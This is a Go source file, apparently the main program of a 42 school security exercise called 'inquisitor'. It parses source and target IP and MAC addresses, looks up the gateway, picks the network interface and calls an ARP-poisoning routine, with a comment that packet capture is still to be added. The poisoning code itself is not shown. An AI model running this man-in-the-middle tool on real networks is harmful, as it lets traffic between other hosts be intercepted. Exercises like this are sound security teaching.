package main

import (
	"log"
	"net"
	"os"
	"fmt"
	"bytes"
	"github.com/jackpal/gateway"
	"github.com/mostlygeek/arp"
	"github.com/migueldar/42CyberSec_inquisitor/arpPoison"
)

//in charge of getting the arguments and turning them into byte arrays
func parse() ([][]byte, error) {
	args := os.Args
	if (len(args) != 5) {
		return nil, fmt.Errorf("Incorrect number of arguments, the structure must be: <IPv4-src><MAC-src><IPv4-target><MAC-target>")
	}
	var introduce []byte
	var err error
	bislice := make([][]byte, 6, 6)
	for i, v := range(args[1:]) {
		if i % 2 == 0 {
			introduce = net.ParseIP(v)
			if introduce == nil {
				return nil, fmt.Errorf("Invalid IP: %s\n", v)
			}
			introduce = net.IP(introduce).To4()
		} else {
			introduce, err = net.ParseMAC(v)
			if err != nil {
				return nil, err
			}
		}
		bislice[i] = introduce
	}
	return bislice, nil
}

func addGateway(args [][]byte) {
	gateIp, err := gateway.DiscoverGateway()
	if err != nil {
		log.Fatal(err)
	}
	gateMACStr := arp.Search(gateIp.String())
	if gateMACStr == "" {
		log.Fatal("Error, gateway's MAC not found in arp table")
	}
	gateMAC, err := net.ParseMAC(gateMACStr)
	if err != nil {
		log.Fatal(err)
	}
	args[4] = gateIp
	args[5] = gateMAC
}

func getInterface(srcMAC []byte) (*net.Interface, error) {
	allInterfaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}
	for _, v := range(allInterfaces) {
		if bytes.Equal(v.HardwareAddr, srcMAC) {
			return &v, nil
		}
	}
	return nil, fmt.Errorf("Network interface not found for given MAC-src")
}

func main() {
	var err error
	args, err := parse()
	if err != nil {
		log.Fatal(err)
	}
	addGateway(args)
	inter, err := getInterface(args[1])
	if err != nil {
		log.Fatal(err)
	}
	//here goes go routine for pcap
	arpPoison.Poison(args, inter)
}
